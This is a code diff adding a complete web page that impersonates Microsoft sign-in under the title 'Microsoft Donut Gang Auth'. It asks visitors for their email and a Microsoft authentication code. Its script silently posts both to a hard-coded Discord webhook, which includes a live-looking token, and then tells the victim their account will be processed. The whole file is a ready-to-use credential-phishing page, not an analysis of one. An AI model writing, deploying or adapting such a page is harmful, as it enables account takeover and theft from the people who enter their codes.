@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft Donut Gang Auth</title>
+    <style>
+        body {
+            font-family: Arial;
+            background: #0d0d0d;
+            color: white;
+            text-align: center;
+            margin-top: 100px;
+        }
+        input, button {
+            padding: 12px;
+            margin: 5px;
+            font-size: 18px;
+            border-radius: 6px;
+        }
+        button {
+            background: #00a2ff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        #codeBox {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Microsoft Donut Gang Auth</h1>
+
+<div id="step1">
+    <p>Enter your Microsoft Email</p>
+    <input type="email" id="email" placeholder="email@example.com">
+    <button onclick="continueToCode()">Next</button>
+</div>
+
+<div id="codeBox">
+    <p>Enter the Microsoft App Auth Code</p>
+    <input type="text" id="mscode" maxlength="10">
+    <button onclick="submitToWebhook()">Verify</button>
+</div>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1489412320340873316/N40FGYid4PxIEsmI9P4biXJlhjmQqvnIDxCxbByKcJWZUWHaAb9Roc3SzsrRymzFLMqq";
+
+// Step 1 — ask for email
+function continueToCode() {
+    const email = document.getElementById("email").value;
+    if (!email) return alert("Please enter a valid email.");
+
+    window.userEmail = email;
+
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("codeBox").style.display = "block";
+}
+
+// Step 2 — user enters Microsoft code
+function submitToWebhook() {
+    const code = document.getElementById("mscode").value;
+
+    if (!code) return alert("Enter the authentication code.");
+
+    // Send the REAL code they entered to your webhook
+    fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: `🔐 **New Microsoft Auth Attempt**\n📧 Email: ${window.userEmail}\n🔢 Code Entered: **${code}**`
+        })
+    });
+
+    alert("Code submitted! We'll process your Microsoft account shortly.");
+
+    // Optional redirect
+    // window.location.href = "/processing";
+}
+</script>
+
+</body>
+</html>
